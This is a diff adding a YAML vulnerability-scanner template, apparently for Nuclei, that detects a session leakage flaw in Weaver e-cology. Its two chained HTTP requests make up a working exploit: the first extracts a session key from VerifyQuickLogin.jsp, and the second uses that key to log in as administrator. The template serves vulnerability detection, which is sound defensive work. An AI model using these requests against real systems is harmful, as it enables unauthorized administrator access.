@@ -1,0 +1,55 @@
+id: weaver-e-cology-verifyquicklogin
+
+info:
+  name: Weaver e-cology VerifyQuickLogin Session Leakage
+  author: xiaobaicai
+  severity: high
+  description: |
+    Detects a session leakage vulnerability in Weaver e-cology VerifyQuickLogin.jsp allowing arbitrary administrator login using extracted session keys.
+  reference:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+
+flow: http(1) && http(2)
+
+http:
+  - id: extract-sessionkey
+    method: POST
+    path:
+      - "/mobile/plugin/VerifyQuickLogin.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: identifier=1&language=1&ipaddress=x.x.x.x
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"sessionkey\":"
+          - "\"message\":\"1\""
+        part: body
+    extractors:
+      - type: regex
+        name: sessionkey
+        internal: true
+        group: 1
+        regex:
+          - '"sessionkey":"(.*?)"'
+
+  - id: verify-login
+    method: POST
+    path:
+      - "/mobile/plugin/plus/login/LoingFromEb.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: loginkey={{sessionkey}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "window.location.href=\"/login/RemindLogin.jsp?RedirectFile=/wui/main.jsp\";"
